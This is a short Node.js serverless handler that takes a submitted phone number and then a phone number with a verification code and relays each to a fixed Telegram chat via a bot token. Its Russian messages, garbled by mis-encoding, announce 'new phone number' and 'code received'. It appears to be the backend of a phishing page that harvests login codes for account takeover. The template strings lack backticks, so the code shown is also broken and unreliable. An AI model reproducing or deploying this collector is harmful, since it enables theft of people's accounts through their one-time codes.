const TelegramBot = require('node-telegram-bot-api');

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || 'YOUR_BOT_TOKEN';
const CHAT_ID = process.env.CHAT_ID || 'YOUR_CHAT_ID';

const bot = new TelegramBot(TELEGRAM_BOT_TOKEN);

exports.handler = async (event, context) => {
    if (event.httpMethod !== 'POST') {
        console.error('–ù–µ–≤–µ—Ä–Ω—ã–π –º–µ—Ç–æ–¥:', event.httpMethod);
        return {
            statusCode: 405,
            body: JSON.stringify({ error: '–ú–µ—Ç–æ–¥ –Ω–µ —Ä–∞–∑—Ä–µ—à–µ–Ω' }),
        };
    }

    try {
        const { type, data } = JSON.parse(event.body);
        console.log('–ó–∞–ø—Ä–æ—Å:', { type, data });
        let message = '';

        if (type === 'phone') {
            message = üîî –ù–æ–≤—ã–π –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞!\n\nüì± –¢–µ–ª–µ—Ñ–æ–Ω: ${data};
        } else if (type === 'code') {
            message = üîë –ü–æ–ª—É—á–µ–Ω –∫–æ–¥!\n\nüì± –¢–µ–ª–µ—Ñ–æ–Ω: ${data.phone}\nüîí –ö–æ–¥: ${data.code};
        } else {
            console.error('–ù–µ–≤–µ—Ä–Ω—ã–π —Ç–∏–ø:', type);
            return {
                statusCode: 400,
                body: JSON.stringify({ error: '–ù–µ–≤–µ—Ä–Ω—ã–π —Ç–∏–ø –∑–∞–ø—Ä–æ—Å–∞' }),
            };
        }

        await bot.sendMessage(CHAT_ID, message);
        console.log('–°–æ–æ–±—â–µ–Ω–∏–µ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ –≤ Telegram');
        return {
            statusCode: 200,
            body: JSON.stringify({ success: true }),
        };
    } catch (error) {
        console.error('–û—à–∏–±–∫–∞:', error.message);
        return {
            statusCode: 500,
            body: JSON.stringify({ error: '–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –≤ Telegram' }),
        };
    }
};
